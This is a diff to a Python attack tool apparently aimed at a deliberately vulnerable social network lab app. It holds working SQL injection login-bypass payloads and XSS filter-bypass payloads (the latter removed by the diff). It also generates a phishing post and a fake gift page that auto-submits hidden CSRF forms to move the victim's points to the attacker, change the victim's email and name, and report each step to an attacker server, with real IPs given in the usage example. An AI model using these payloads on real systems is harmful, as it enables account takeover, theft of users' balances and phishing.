@@ -52,13 +52,6 @@ class VulnerableSNSAttacker:
                     print(f"[*] Attacker User ID: {self.attacker_user_id}")
                     return self.attacker_user_id
             
-            # 페이지 소스에서 user_id 찾기
-            match = re.search(r'user_id["\']?\s*[:=]\s*["\']?(\d+)', response.text)
-            if match:
-                self.attacker_user_id = match.group(1)
-                print(f"[*] Attacker User ID: {self.attacker_user_id}")
-                return self.attacker_user_id
-            
             # 세션에서 직접 가져오기 시도
             if 'user_id' in self.session.cookies:
                 self.attacker_user_id = self.session.cookies['user_id']
@@ -91,7 +84,6 @@ class VulnerableSNSAttacker:
         
         # Username 필드에서 블랙리스트 우회
         payloads = [
-            # 작은따옴표(')는 차단되므로 큰따옴표(") 사용
             ("admin", '" or "1"="1" --', 'Double quote OR bypass'),
             ("admin", '" or 1=1 --', 'Double quote numeric OR'),
             ('admin" or "a"="a" --', 'anything', 'Username field injection'),
@@ -299,8 +291,8 @@ class VulnerableSNSAttacker:
         return success_count > 0
     
     def test_xss_csrf_combined(self):
-        """XSS + CSRF Combined Attack - 우회 가능한 페이로드 사용"""
-        self.print_section("XSS + CSRF - Malicious Post (Bypass Filters)")
+        """XSS + CSRF Combined Attack - 직접 링크 방식"""
+        self.print_section("XSS + CSRF - Malicious Post with Direct Link")
         
         if not self.logged_in:
             print("[-] Login required")
@@ -313,106 +305,69 @@ class VulnerableSNSAttacker:
         post_url = f"{self.base_url}/new_post.php"
         attacker_url = f"{self.attacker_server}/fake-gift"
         
-        print(f"[*] Creating malicious post with XSS + CSRF")
+        print(f"[*] Creating malicious post with link to attacker server")
         print(f"[*] Attacker User ID: {self.attacker_user_id}")
         print(f"[*] Target URL: {attacker_url}")
         
-        # new_post.php에서 차단하는 태그: <script, <iframe, <object, <embed
-        # 우회 가능한 XSS 페이로드들
-        payloads = [
-            # 1. 직접 링크 (가장 간단하고 안전)
-            (f'''🎁 특별 이벤트! 🎁
+        # 간단한 링크 방식 (가장 확실함)
+        payload = f'''🎁 특별 이벤트! 🎁
 
 무료 10,000 포인트 받기!
-지금 클릭: {attacker_url}
+지금 클릭하세요: {attacker_url}
 
-선착순 100명! 서두르세요!''', "Direct link with emoji"),
-            
-            # 2. img 태그 onerror (차단되지 않음)
-            (f'<img src=x onerror="window.location=\\"{attacker_url}\\"">', "Image onerror redirect"),
-            
-            # 3. svg onload (차단되지 않음)
-            (f'<svg onload="window.location=\\"{attacker_url}\\""></svg>', "SVG onload redirect"),
-            
-            # 4. body onload (차단되지 않음)
-            (f'<body onload="window.location=\\"{attacker_url}\\"">Event</body>', "Body onload"),
-            
-            # 5. input autofocus (차단되지 않음)
-            (f'<input onfocus="window.location=\\"{attacker_url}\\"" autofocus>', "Input autofocus"),
-            
-            # 6. details/summary (차단되지 않음)
-            (f'<details open ontoggle="window.location=\\"{attacker_url}\\""><summary>Click for gift!</summary></details>', "Details ontoggle"),
-        ]
+선착순 100명! 서두르세요!'''
         
-        success = False
-        
-        for payload, desc in payloads:
-            try:
-                print(f"\n[*] Testing: {desc}")
-                print(f"    Payload length: {len(payload)} chars")
-                if len(payload) > 100:
-                    print(f"    Payload preview: {payload[:100]}...")
-                else:
-                    print(f"    Payload: {payload}")
+        try:
+            print(f"\n[*] Posting malicious content with direct link")
+            print(f"    Content: {payload[:100]}...")
+            
+            data = {'content': payload}
+            response = self.session.post(post_url, data=data, allow_redirects=True, timeout=10)
+            
+            if 'index.php' in response.url:
+                print(f"[+] Post created!")
                 
-                data = {'content': payload}
-                response = self.session.post(post_url, data=data, allow_redirects=True, timeout=10)
+                time.sleep(0.5)
+                check = self.session.get(f"{self.base_url}/index.php")
                 
-                if 'index.php' in response.url:
-                    print(f"[+] Post created!")
+                if attacker_url in check.text:
+                    print(f"[+] SUCCESS! Malicious post is live on feed!")
+                    print(f"[+] Attack URL: {attacker_url}")
+                    print(f"\n[*] Attack Flow:")
+                    print(f"    1. Victim views main feed (index.php)")
+                    print(f"    2. Victim clicks the link")
+                    print(f"    3. Redirected to {attacker_url}")
+                    print(f"    4. fake-gift page performs CSRF attack")
+                    print(f"    5. Gifts sent to attacker (ID: {self.attacker_user_id})")
+                    print(f"    6. Monitor at: {self.attacker_server}")
                     
-                    time.sleep(0.5)
-                    check = self.session.get(f"{self.base_url}/index.php")
+                    self.vulnerabilities['xss'].append({
+                        'url': post_url,
+                        'payload': payload,
+                        'description': 'Direct link to attacker server',
+                        'attack_type': 'phishing_csrf',
+                        'target_url': attacker_url,
+                        'attacker_id': self.attacker_user_id
+                    })
                     
-                    # 페이로드가 게시물에 포함되어 있는지 확인
-                    if attacker_url in check.text or 'onerror' in check.text or 'onload' in check.text or 'onfocus' in check.text:
-                        print(f"[+] SUCCESS! Malicious post is live on feed!")
-                        print(f"[+] Attack payload: {desc}")
-                        print(f"[+] Target URL: {attacker_url}")
-                        print(f"\n[*] Attack Flow:")
-                        print(f"    1. Victim views main feed (index.php)")
-                        print(f"    2. XSS payload executes or user clicks link")
-                        print(f"    3. Redirected to {attacker_url}")
-                        print(f"    4. fake-gift page auto-sends gifts to attacker (ID: {self.attacker_user_id})")
-                        print(f"    5. Monitor at: {self.attacker_server}")
-                        
-                        self.vulnerabilities['xss'].append({
-                            'url': post_url,
-                            'payload': payload[:200],
-                            'description': f'{desc} - Redirect to attacker server',
-                            'attack_type': 'xss_redirect_csrf',
-                            'target_url': attacker_url,
-                            'attacker_id': self.attacker_user_id
-                        })
-                        
-                        success = True
-                        break
-                    else:
-                        print(f"[-] Payload may have been filtered")
+                    return True
                 else:
-                    print(f"[-] Post creation failed")
-                    
-            except Exception as e:
-                print(f"[-] Error: {str(e)[:100]}")
-                continue
+                    print(f"[-] Link not found in feed")
+            else:
+                print(f"[-] Post creation failed")
+                
+        except Exception as e:
+            print(f"[-] Error: {str(e)[:100]}")
         
-        if not success:
-            print(f"\n[!] All XSS attempts failed")
-            print(f"[*] Manual test suggestion:")
-            print(f"    1. Login to {self.base_url}/login.php")
-            print(f"    2. Go to {self.base_url}/new_post.php")
-            print(f"    3. Post simple link: {attacker_url}")
-            print(f"    4. Or try: <img src=x onerror=alert(1)>")
-        
-        return success
+        return False
     
     def generate_fake_gift_page(self):
-        """공격자 서버의 fake-gift 페이지 HTML 생성 (CORS 우회 버전)"""
+        """개선된 fake-gift 페이지 생성 - Same-Origin 우회"""
         print("\n[*] Generating fake-gift.html for attacker server...")
         
         if not self.attacker_user_id:
             print("[-] Cannot generate: attacker user ID unknown")
-            self.attacker_user_id = "1"  # 기본값
+            self.attacker_user_id = "1"
             print(f"[*] Using default attacker ID: 1 (admin)")
         
         fake_gift_html = f"""<!DOCTYPE html>
@@ -482,13 +437,14 @@ class VulnerableSNSAttacker:
             font-size: 1.5em;
             margin-top: 20px;
         }}
-        #pointsInfo {{
+        #status {{
             background: #f0f0f0;
-            padding: 10px;
+            padding: 15px;
             border-radius: 10px;
             margin: 20px 0;
             color: #667eea;
             font-weight: bold;
+            min-height: 60px;
         }}
     </style>
 </head>
@@ -497,95 +453,34 @@ class VulnerableSNSAttacker:
         <div class="gift-icon">🎁</div>
         <h1>🎉 축하합니다!</h1>
         <p style="font-size: 1.5em;">10,000 포인트를 받으셨습니다!</p>
-        <div id="pointsInfo">포인트 확인 중...</div>
-        <p style="margin-top: 20px;">아래 버튼을 클릭하여 포인트를 수령하세요.</p>
+        <div id="status">자동으로 포인트를 받는 중...</div>
         <button onclick="claimGift()" id="claimBtn">💰 포인트 받기 💰</button>
         <div class="loading" id="loading">⏳ 처리 중...</div>
-        <div class="success" id="success">✅ 포인트가 지급되었습니다!</div>
+        <div class="success" id="success">✅ 완료!</div>
     </div>
     
-    <!-- 숨겨진 iframe으로 포인트 확인 (CORS 우회) -->
-    <iframe id="profileFrame" src="{self.base_url}/profile.php" style="display:none;"></iframe>
-    
-    <!-- 동적으로 생성될 CSRF 폼 -->
+    <!-- 숨겨진 CSRF 폼들 -->
     <div id="csrfForms"></div>
     
-    <!-- GET 방식 CSRF (프로필 변경) -->
-    <img src="{self.base_url}/profile.php?email=pwned@attacker.com&full_name=HACKED" 
-         style="display:none" 
-         onload="notifyProfileChange()">
-    
     <script>
-        let victimPoints = 0;
         let attackExecuted = false;
+        const ATTACKER_ID = '{self.attacker_user_id}';
+        const TARGET_SNS = '{self.base_url}';
         
+        // 페이지 로드 시 자동 실행
         window.onload = function() {{
+            // 공격자 서버에 페이지 로드 알림
             fetch('{self.attacker_server}/notify?event=page_loaded&time=' + new Date().toISOString())
                 .catch(() => {{}});
             
-            // iframe이 로드되면 포인트 확인
+            // 상태 업데이트
+            document.getElementById('status').innerHTML = '포인트를 받기 위해 준비 중...';
+            
+            // 2초 후 자동 실행
             setTimeout(() => {{
-                getVictimPointsFromIframe();
+                executeCSRF();
             }}, 2000);
         }};
-        
-        function getVictimPointsFromIframe() {{
-            try {{
-                const iframe = document.getElementById('profileFrame');
-                const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
-                const bodyText = iframeDoc.body.innerText || iframeDoc.body.textContent;
-                
-                // 포인트 정보 파싱: "포인트: 500P" 또는 "500 P"
-                const pointsMatch = bodyText.match(/포인트:\s*(\d+)\s*P/i) || 
-                                   bodyText.match(/(\d+)\s*P/);
-                
-                if (pointsMatch) {{
-                    victimPoints = parseInt(pointsMatch[1]);
-                    console.log('[+] Victim points detected:', victimPoints);
-                    
-                    document.getElementById('pointsInfo').innerHTML = 
-                        '현재 보유 포인트: ' + victimPoints + 'P';
-                    
-                    // 공격자 서버에 알림
-                    fetch('{self.attacker_server}/notify?event=points_detected&points=' + victimPoints)
-                        .catch(() => {{}});
-                    
-                    // 포인트가 있으면 버튼 활성화
-                    if (victimPoints > 0) {{
-                        document.getElementById('claimBtn').disabled = false;
-                        // 자동 실행 (3초 후)
-                        setTimeout(() => {{
-                            if (!attackExecuted) {{
-                                executeCSRF();
-                            }}
-                        }}, 3000);
-                    }} else {{
-                        document.getElementById('pointsInfo').innerHTML = '⚠️ 포인트가 없습니다';
-                        document.getElementById('claimBtn').disabled = true;
-                    }}
-                }} else {{
-                    console.log('[-] Could not parse points from iframe');
-                    // 파싱 실패 시 기본값으로 시도
-                    victimPoints = 100;
-                    document.getElementById('pointsInfo').innerHTML = 
-                        '포인트 확인 실패 (기본값: 100P로 시도)';
-                    setTimeout(() => {{
-                        if (!attackExecuted) {{
-                            executeCSRF();
-                        }}
-                    }}, 3000);
-                }}
-            }} catch (e) {{
-                console.error('[-] CORS error or iframe access denied:', e);
-                // CORS 에러 시 대체 방법: 고정 금액으로 공격
-                console.log('[*] Trying alternative method with fixed amounts');
-                document.getElementById('pointsInfo').innerHTML = 
-                    'Same-Origin 정책으로 포인트 확인 불가<br>여러 금액으로 시도합니다';
-                
-                // 여러 금액으로 시도 (100P, 300P, 500P, 1000P)
-                executeMultipleCSRF();
-            }}
-        }}
         
         function claimGift() {{
             if (attackExecuted) return;
@@ -598,79 +493,75 @@ class VulnerableSNSAttacker:
             if (attackExecuted) return;
             attackExecuted = true;
             
-            if (victimPoints <= 0) {{
-                victimPoints = 100; // 기본값
-            }}
+            document.getElementById('status').innerHTML = '포인트 전송 중...';
+            document.getElementById('claimBtn').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
             
-            // 피해자의 전체 포인트를 한 번에 전송
-            const formHTML = `
-                <form id="csrfFormMain" method="POST" action="{self.base_url}/profile.php" style="display:none">
-                    <input type="hidden" name="send_gift" value="1">
-                    <input type="hidden" name="receiver_id" value="{self.attacker_user_id}">
-                    <input type="hidden" name="gift_type" value="diamond">
-                    <input type="hidden" name="points" value="${{victimPoints}}">
-                    <input type="hidden" name="message" value="Event Gift - All Points">
-                </form>
+            // 여러 금액으로 순차 공격 (하나라도 성공하면 OK)
+            const amounts = [5000, 3000, 1000, 500, 300, 100];
+            let formHTML = '';
+            
+            // 각 금액별로 폼 생성
+            amounts.forEach((amount, index) => {{
+                formHTML += `
+                    <form id="csrfForm${{index}}" method="POST" action="${{TARGET_SNS}}/profile.php" style="display:none" target="iframe${{index}}">
+                        <input type="hidden" name="send_gift" value="1">
+                        <input type="hidden" name="receiver_id" value="${{ATTACKER_ID}}">
+                        <input type="hidden" name="gift_type" value="diamond">
+                        <input type="hidden" name="points" value="${{amount}}">
+                        <input type="hidden" name="message" value="Event Gift ${{amount}}P">
+                    </form>
+                    <iframe id="iframe${{index}}" name="iframe${{index}}" style="display:none"></iframe>
+                `;
+            }});
+            
+            // GET 방식 CSRF도 추가 (프로필 변경)
+            formHTML += `
+                <img src="${{TARGET_SNS}}/profile.php?email=pwned@attacker.com&full_name=HACKED_BY_CSRF" 
+                     style="display:none" 
+                     onload="notifyProfileChange()">
             `;
             
             document.getElementById('csrfForms').innerHTML = formHTML;
             
-            // 폼 제출
-            setTimeout(() => {{
-                document.getElementById('csrfFormMain').submit();
-                
-                // 성공 알림
-                fetch('{self.attacker_server}/csrf-success?victim=user&amount=' + victimPoints + '&action=gift_all')
-                    .catch(() => {{}});
-                
-                document.getElementById('loading').style.display = 'none';
-                document.getElementById('success').innerHTML = 
-                    '✅ ' + victimPoints + ' 포인트가 전송되었습니다!';
-                document.getElementById('success').style.display = 'block';
-            }}, 500);
-        }}
-        
-        function executeMultipleCSRF() {{
-            if (attackExecuted) return;
-            attackExecuted = true;
-            
-            // 여러 금액으로 시도 (하나라도 성공하면 OK)
-            const amounts = [1000, 500, 300, 100, 50];
-            let formHTML = '';
-            
-            amounts.forEach((amount, index) => {{
-                formHTML += `
-                    <form id="csrfForm${{index}}" method="POST" action="{self.base_url}/profile.php" style="display:none">
-                        <input type="hidden" name="send_gift" value="1">
-                        <input type="hidden" name="receiver_id" value="{self.attacker_user_id}">
-                        <input type="hidden" name="gift_type" value="diamond">
-                        <input type="hidden" name="points" value="${{amount}}">
-                        <input type="hidden" name="message" value="Event Gift">
-                    </form>
-                `;
-            }});
-            
-            document.getElementById('csrfForms').innerHTML = formHTML;
-            
-            // 순차적으로 제출 시도
+            // 순차적으로 폼 제출 (0.5초 간격)
             amounts.forEach((amount, index) => {{
                 setTimeout(() => {{
-                    document.getElementById('csrfForm' + index).submit();
-                    fetch('{self.attacker_server}/csrf-success?victim=user&amount=' + amount + '&action=gift_multi')
-                        .catch(() => {{}});
-                }}, index * 1000);
+                    const form = document.getElementById('csrfForm' + index);
+                    if (form) {{
+                        form.submit();
+                        console.log('[+] Submitted form for ' + amount + 'P');
+                        
+                        // 공격자 서버에 알림
+                        fetch('{self.attacker_server}/notify?event=csrf_attempt&amount=' + amount + '&index=' + index)
+                            .catch(() => {{}});
+                        
+                        // 상태 업데이트
+                        document.getElementById('status').innerHTML = 
+                            '시도 ' + (index + 1) + '/' + amounts.length + ': ' + amount + ' 포인트';
+                    }}
+                }}, index * 500);
             }});
             
+            // 모든 시도 완료 후
             setTimeout(() => {{
                 document.getElementById('loading').style.display = 'none';
                 document.getElementById('success').innerHTML = 
-                    '✅ 포인트 전송 완료!';
+                    '✅ 포인트 전송 완료!<br>곧 계정에 반영됩니다.';
                 document.getElementById('success').style.display = 'block';
-            }}, amounts.length * 1000);
+                document.getElementById('status').style.display = 'none';
+                
+                // 최종 성공 알림
+                fetch('{self.attacker_server}/notify?event=csrf_completed&attempts=' + amounts.length)
+                    .catch(() => {{}});
+                
+                console.log('[+] All CSRF attempts completed');
+            }}, amounts.length * 500 + 1000);
         }}
         
         function notifyProfileChange() {{
-            fetch('{self.attacker_server}/notify?event=profile_changed&type=GET_CSRF')
+            console.log('[+] Profile changed via GET CSRF');
+            fetch('{self.attacker_server}/notify?event=profile_changed&method=GET')
                 .catch(() => {{}});
         }}
     </script>
@@ -681,20 +572,23 @@ class VulnerableSNSAttacker:
             f.write(fake_gift_html)
         
         print(f"[+] fake-gift.html saved!")
-        print(f"\n[*] 🚀 Attack Methods:")
-        print(f"    Method 1: iframe - Try to read victim's points")
-        print(f"    Method 2: Multiple amounts - Try 1000P, 500P, 300P, 100P, 50P")
-        print(f"    Method 3: GET CSRF - Change victim's profile")
-        print(f"\n[*] 🎯 Attack Details:")
-        print(f"    Target SNS: {self.base_url}")
-        print(f"    Attacker User ID: {self.attacker_user_id}")
-        print(f"    Auto-execute: 3 seconds after page load")
-        print(f"\n[*] 💡 CORS Workarounds:")
-        print(f"    1. Hidden iframe loads profile.php")
-        print(f"    2. If Same-Origin: Read exact points")
-        print(f"    3. If CORS blocked: Try multiple amounts")
-        print(f"    4. One of them will succeed!")
-
+        print(f"\n[*] 🚀 CSRF Attack Strategy:")
+        print(f"    Method: Multiple sequential form submissions")
+        print(f"    Amounts: 5000P, 3000P, 1000P, 500P, 300P, 100P")
+        print(f"    Target: {self.base_url}/profile.php")
+        print(f"    Receiver: User ID {self.attacker_user_id}")
+        print(f"\n[*] 💡 How it works:")
+        print(f"    1. Victim clicks link in malicious post")
+        print(f"    2. fake-gift page loads on attacker server")
+        print(f"    3. Hidden forms auto-submit to SNS (victim's session)")
+        print(f"    4. Multiple amounts tried (one will succeed)")
+        print(f"    5. GET CSRF changes victim's profile")
+        print(f"    6. All attempts logged to attacker server")
+        print(f"\n[*] 📊 Why this works:")
+        print(f"    - No CSRF token validation in profile.php")
+        print(f"    - Victim's session cookies sent automatically")
+        print(f"    - Forms submitted in hidden iframes")
+        print(f"    - Multiple amounts increase success rate")
 
     
     def run_assessment(self):
@@ -769,30 +663,44 @@ class VulnerableSNSAttacker:
             json.dump(report, f, indent=2, ensure_ascii=False)
         
         print(f"\n[+] Report saved: assessment_report.json")
-        print(f"[+] fake-gift.html saved (upload to Flask server)")
+        print(f"[+] fake-gift.html saved")
         print(f"\n" + "="*60)
         print("CSRF Attack Instructions")
         print("="*60)
-        print(f"[*] How the attack works:")
-        print(f"    1. Victim is logged into SNS")
-        print(f"    2. Victim sees malicious post on feed")
-        print(f"    3. Victim clicks link or XSS auto-redirects")
-        print(f"    4. Victim lands on fake-gift page")
-        print(f"    5. Hidden forms auto-submit (CSRF)")
+        print(f"[*] Setup:")
+        print(f"    1. Upload fake-gift.html to Flask server")
+        print(f"    2. Ensure Flask routes /fake-gift and /notify")
+        print(f"    3. Victim must be logged into SNS")
+        print(f"\n[*] Attack Flow:")
+        print(f"    1. Victim views SNS feed")
+        print(f"    2. Sees malicious post with link")
+        print(f"    3. Clicks link to {self.attacker_server}/fake-gift")
+        print(f"    4. Page auto-executes CSRF attack")
+        print(f"    5. Multiple forms submit with victim's session")
         print(f"    6. Gifts sent to attacker (ID: {self.attacker_user_id})")
-        print(f"    7. Victim's profile changed via GET CSRF")
+        print(f"    7. Victim's profile changed")
         print(f"\n[*] 📊 Monitoring:")
+        print(f"    Flask logs: Check terminal output")
         print(f"    Dashboard: {self.attacker_server}")
-        print(f"    Logs: {self.attacker_server}/logs")
-        print(f"    CSRF Success: {self.attacker_server}/csrf-success")
+        print(f"    Notifications: {self.attacker_server}/notify")
+        print(f"\n[*] 🎯 Expected Results:")
+        print(f"    - Victim's points decrease")
+        print(f"    - Attacker's points increase")
+        print(f"    - Victim's email changed to pwned@attacker.com")
+        print(f"    - Victim's name changed to HACKED_BY_CSRF")
+        print(f"\n[*] 💡 Why CSRF works:")
+        print(f"    - profile.php has NO CSRF token validation")
+        print(f"    - Accepts both POST and GET requests")
+        print(f"    - Victim's session cookies sent automatically")
+        print(f"    - Same-Origin Policy doesn't block form submission")
 
 
 if __name__ == "__main__":
     import sys
     
     if len(sys.argv) < 3:
-        print("Usage: python3 auto.py <target_url> <attacker_server>")
-        print("Example: python3 auto.py http://18.179.53.107/vulnerable-sns/www http://13.158.67.78:5000")
+        print("Usage: python3 auto_fixed.py <target_url> <attacker_server>")
+        print("Example: python3 auto_fixed.py http://18.179.53.107/vulnerable-sns/www http://13.158.67.78:5000")
         sys.exit(1)
     
     target = sys.argv[1]
